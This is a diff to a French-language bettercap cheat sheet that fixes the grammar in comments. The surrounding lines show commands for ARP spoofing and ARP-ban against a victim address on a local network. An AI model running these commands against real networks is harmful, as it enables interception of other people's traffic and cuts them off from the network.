@@ -23,10 +23,10 @@ $ sudo bettercap
 >>> faire du spoofing pour l'adresse <victime> donnée.
 
 10.0.2.0/24 > 10.0.2.5 » arp.spoof on
->>> active le ARP spoofing. 
+>>> active l'ARP spoofing. 
 
 10.0.2.0/24 > 10.0.2.5 » arp.ban on
->>> active le ARP spoofing ban.
+>>> active l'ARP spoofing ban.
 
 >@
 >@#########################################################
@@ -50,10 +50,10 @@ $ sudo bettercap
 >@» set arp.spoof.target <victime>
 >@
 >@» arp.spoof on
->@>>> demarre le arp spoofing sur <victime>
+>@>>> demarre l'ARP spoofing sur <victime>
 >@
 >@» arp.ban on
->@>>> demarre le arpspoofing en mode ban sur <victime>
+>@>>> demarre l'ARP spoofing en mode ban sur <victime>
 >@
 >@#########################################################
 >@
